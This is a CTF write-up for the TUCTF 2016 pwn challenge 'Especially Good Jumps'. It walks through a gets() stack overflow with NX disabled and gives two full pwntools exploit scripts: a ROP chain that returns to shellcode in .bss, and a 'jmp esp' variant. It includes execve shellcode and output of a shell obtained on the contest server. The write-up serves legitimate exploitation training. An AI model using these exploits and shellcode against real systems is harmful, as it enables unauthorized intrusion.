---
layout: post
title: "TUCTF 2016: Especially Good Jumps (pwn 75)"
author: f0rki
categories: writeup
tags: [cat/pwn, tool/binjitsu]
---

* **Category:** pwn
* **Points:** 75
* **Description:**

> Pop a shell.
> Binary is hosted at: 130.211.202.98:7575
> EDIT:
> ASLR is enabled on remote server.

## Write-up

We have classic stack-based buffer overflow vulnerability at hand:

```
│           0x0804853f      8d442410       lea eax, [esp + arg_10h]    ; 0x10
│           0x08048543      890424         mov dword [esp], eax
│           0x08048546      e885feffff     call sym.imp.gets
```

`gets` does not bounds-checking whatsoever. Let's check protection mechanisms.

```
checksec 23e4f31a5a8801a554e1066e26eb34745786f4c4
[*] '/media/ctf/tuctf2016/Especially Good Jumps (pwn 75)/23e4f31a5a8801a554e1066e26eb34745786f4c4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

Hooray. Nothing there. This should be easy. The description hinted that we need
to bypass ASLR. The binary also writes to a global variable called `meow`.
Interestingly when you compile a program with `-zexecstack`, it will not only
make the stack executable but also disable execute prevention on other
segments, such as `.bss`. So we could write something like `call esp` into
`meow` and return to it.

```
[0x08048420]> iS~bss
idx=25 vaddr=0x0804a040 paddr=0x00001030 sz=12 vsz=12 perm=--rw- name=.bss
```

The OS will map a whole page for `.bss` even though it's only 12 bytes. So we
can also write all of our shellcode into `.bss`. We'll use a minimal ROP chain
to achieve this.

1. call `gets(&meow)`
2. return to `&meow`

We'll use a simple shell spawning shellcode.


```python
#!/usr/bin/env python

from pwn import *  # NOQA

vulnbinp = "./23e4f31a5a8801a554e1066e26eb34745786f4c4"
velf = ELF(vulnbinp)

# determine how much we need to overwrite until retaddr
# pl = cyclic(201)
# cyclic -c i386 -l 0x6161616c
l = 44

sc = shellcraft.linux.sh()
sca = asm(sc)
log.info("Using shellcode\n" + sc)
log.info(hexdump(sca))

chain = ROP(velf)
chain.call('gets', [velf.symbols['meow']])  # write shellcode
chain.call(velf.symbols['meow'])  # return to shellcode

log.info("Using rop chain\n" + chain.dump())

pl = "A" * l
pl += str(chain)
# pl += "BBBB"
pl += "\n"
pl += str(0x42424242)

vp = process(vulnbinp)
# gdb.attach(vp)
# vp = remote("130.211.202.98", 7575)

vp.send(pl)

vp.sendline(sca)

vp.sendline()
vp.readline()

with context.local(log_level='debug'):
    vp.sendline("id")
    vp.sendline("pwd; ls -al;")
    vp.sendline("cat flag.txt")
    vp.clean_and_log()

vp.interactive()
vp.close()
```


```
[*] '/ctf/tuctf2016/Especially Good Jumps (pwn 75)/23e4f31a5a8801a554e1066e26eb34745786f4c4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
[*] Using shellcode
        /* push '/bin///sh\x00' */
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f

        /* call execve('esp', 0, 0) */
        push (SYS_execve) /* 0xb */
        pop eax
        mov ebx, esp
        xor ecx, ecx
        cdq /* edx=0 */
        int 0x80
[*] 00000000  6a 68 68 2f  2f 2f 73 68  2f 62 69 6e  6a 0b 58 89  │jhh/│//sh│/bin│j·X·│
    00000010  e3 31 c9 99  cd 80                                  │·1··│··│
    00000016
[*] Loaded cached gadgets for './23e4f31a5a8801a554e1066e26eb34745786f4c4'
[*] Using rop chain
    0x0000:        0x80483d0 gets(134520904)
    0x0004:        0x804839d <adjust: pop ebx; ret>
    0x0008:        0x804a048 meow
    0x000c:        0x804a048 0x804a048()
    0x0010:           'eaaa' <pad>
[+] Opening connection to 130.211.202.98 on port 7575: Done
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Sent 0xd bytes:
    'pwd; ls -al;\n'
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[*] Switching to interactive mode
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAЃ\x0\x9d\x83\x0H\xa0\x0��\x9d\x83\x0H\xa0\x0H\xa0\x0haaa, 1111638594 is an even number!
uid=1002(pwn75) gid=1002(pwn75) groups=1002(pwn75)
/home/pwn75
total 32
drwxr-x--- 2 root pwn75 4096 May 11 19:12 .
drwxr-xr-x 8 root root  4096 May 12 17:48 ..
-rw-r--r-- 1 root pwn75  220 May 11 18:54 .bash_logout
-rw-r--r-- 1 root pwn75 3637 May 11 18:54 .bashrc
-rw-r--r-- 1 root pwn75  675 May 11 18:54 .profile
-rwxr-xr-x 1 root pwn75 7548 May 11 18:48 easy
-r--r----- 1 root pwn75   44 May 11 18:52 flag.txt
TUCTF{th0se_were_s0me_ESPecially_good_JMPs}
$

```

Done :)


For completeness reasons, here is the variant where we write `jmp esp` into
`meow` and return there. Well this exploit is kind of simpler.

```python
#!/usr/bin/env python

from pwn import *  # NOQA

vulnbinp = "./23e4f31a5a8801a554e1066e26eb34745786f4c4"
velf = ELF(vulnbinp)

# pl = cyclic(201)
# cyclic -c i386 -l 0x6161616c
l = 44

sc = shellcraft.linux.sh()
sca = asm(sc)
log.info("Using shellcode\n" + sc)

meow = u16(asm('jmp esp'))

pl = "A" * l  # fill stack
pl += p32(velf.symbols['meow'])  # return to meow
pl += asm(shellcraft.nop()) * 8  # some nops
pl += sca  # actual shellcode
# pl += "BBBB"
pl += "\n"
pl += meow  # write 'jmp esp' into meow

log.info("Sending payload:\n" + hexdump(pl))

vp = process(vulnbinp)
gdb.attach(vp)
# vp = remote("130.211.202.98", 7575)

vp.send(pl)

vp.sendline()
vp.readline()

with context.local(log_level='debug'):
    vp.sendline("id")
    vp.sendline("pwd; ls -al;")
    vp.sendline("cat flag.txt")
    vp.clean_and_log()

vp.interactive()
vp.close()
```
